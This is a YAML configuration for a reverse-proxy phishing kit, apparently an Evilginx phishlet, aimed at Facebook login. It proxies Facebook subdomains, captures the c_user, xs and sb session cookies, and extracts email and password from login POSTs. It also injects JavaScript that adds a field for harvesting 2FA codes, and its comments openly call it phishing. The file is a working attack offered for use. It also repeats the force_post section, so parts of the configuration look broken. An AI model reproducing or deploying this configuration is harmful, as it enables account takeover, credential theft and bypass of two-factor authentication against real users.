min_ver: '3.0.0'

proxy_hosts:
  # Phishing subdomain for Facebook login page.
  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
  # Mobile version of Facebook login.
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
  # Static content for Facebook, such as images and scripts.
  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false, auto_filter: true}

# Authentication tokens configurations: Capturing and handling session cookies.
auth_tokens:
  # Targeting Facebook domain (trigger)
  - domain: '.facebook.com'
    keys: ['c_user', 'xs', 'sb']
    type: 'cookie'

# Credentials configurations: Defining how to extract user credentials.
credentials:
  # Capturing username from the Facebook login form.
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  # Capturing password from the Facebook login form.
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'

# Force POST request configurations: Manipulating form submissions.
force_post:
  # Intercepting and modifying POST data on the login path.
  - path: '/login.php'
    search:
      - {key: 'email', search: '.*'}
      - {key: 'pass', search: '.*'}
    type: 'post'

############################
# After capturing the username and password, you can add a section to capture the 2FA code.
force_post:
  # Intercepting and modifying POST data on the login path.
  - path: '/login.php'
    search:
      - {key: 'email', search: '.*'}
      - {key: 'pass', search: '.*'}
    type: 'post'

  # Capturing the 2FA code after the first login attempt
  - path: '/login/2fa'  # Adjust to the correct path for the 2FA submission
    search:
      - {key: '2fa_code', search: '(.*)'}  # Capture the 2FA code
    type: 'post'

# Add logic in your JS to show the 2FA input field after initial login.
js_inject:
  - trigger_domains: ["www.facebook.com"]
    trigger_paths: ["/login.php"]
    script: |
      // After submitting the username and password, show a prompt for the 2FA code.
      var submit = document.querySelector('button[type=submit]');
      submit.addEventListener('click', function() {
          // Wait for the login response, and if it indicates a 2FA request, show the 2FA input field.
          setTimeout(function() {
              var twoFactorField = document.createElement('input');
              twoFactorField.setAttribute('type', 'text');
              twoFactorField.setAttribute('name', '2fa_code');
              twoFactorField.setAttribute('placeholder', 'Enter 2FA code');
              document.querySelector('form').appendChild(twoFactorField);
          }, 2000);  // Adjust timing as necessary.
      });
# Login page configuration: Defining the entry point for phishing.

login:
  # Setting the login domain and path for the initial phishing page.
  domain: 'm.facebook.com'
  path: '/login.php'
